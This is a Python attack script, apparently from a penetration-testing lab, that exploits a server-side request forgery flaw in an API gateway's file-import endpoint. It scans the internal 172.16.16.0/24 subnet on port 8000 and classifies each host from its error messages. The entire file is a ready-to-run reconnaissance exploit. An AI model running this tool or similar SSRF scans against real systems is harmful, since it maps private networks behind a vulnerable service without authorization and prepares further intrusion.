#!/usr/bin/env python3


"""
Usage:
python3 host_enum.py -t http://apigateway:8000/files/import --timeout 5
"""


import argparse
import requests

# Argument parsing
parser = argparse.ArgumentParser(description="Scan the 172.16.16.* subnet via SSRF.")
parser.add_argument('-t', '--target', help='SSRF-vulnerable host/IP to target', required=True)
parser.add_argument('--timeout', help='Request timeout in seconds (default: 3)', type=int, default=3)
parser.add_argument('-v', '--verbose', help='Enable verbose mode', action='store_true')
args = parser.parse_args()

# Config
base_url = args.target
base_ip_template = "http://172.16.16.{octet}"
ports = [8000]
timeout = args.timeout

# Scan loop
for octet in range(1, 255):
    host_ip = base_ip_template.format(octet=octet)
    display_host = host_ip.replace("http://", "")
    print(f"Trying host: {display_host}")

    for port in ports:
        full_url = f"{host_ip}:{port}"
        try:
            payload = {"url": full_url}
            response = requests.post(url=base_url, json=payload, timeout=timeout)

            if args.verbose:
                print(f"\t{port}\tVERBOSE: {response.text.strip()}")

            text = response.text

            if "status code 404" in text:
                print(f"\t{port}\tOPEN - returned 404")
            elif "You don't have permission to access this." in text:
                print(f"\t{port}\tOPEN - permission error (valid resource)")
            elif "Parse Error:" in text:
                print(f"\t{port}\tPOTENTIALLY OPEN - parse error, possibly non-HTTP")
            elif "socket hang up" in text:
                print(f"\t{port}\tOPEN - socket hang up, likely non-HTTP")
            elif "ECONNREFUSED" in text:
                print(f"\t{port}\tREFUSED - connection refused, likely live host")
            else:
                if args.verbose:
                    print(f"\t{port}\tUNKNOWN RESPONSE: {text.strip()[:100]}")

        except requests.exceptions.Timeout:
            print(f"\t{port}\tTIMED OUT")
        except requests.exceptions.RequestException as e:
            print(f"\t{port}\tERROR: {e}")
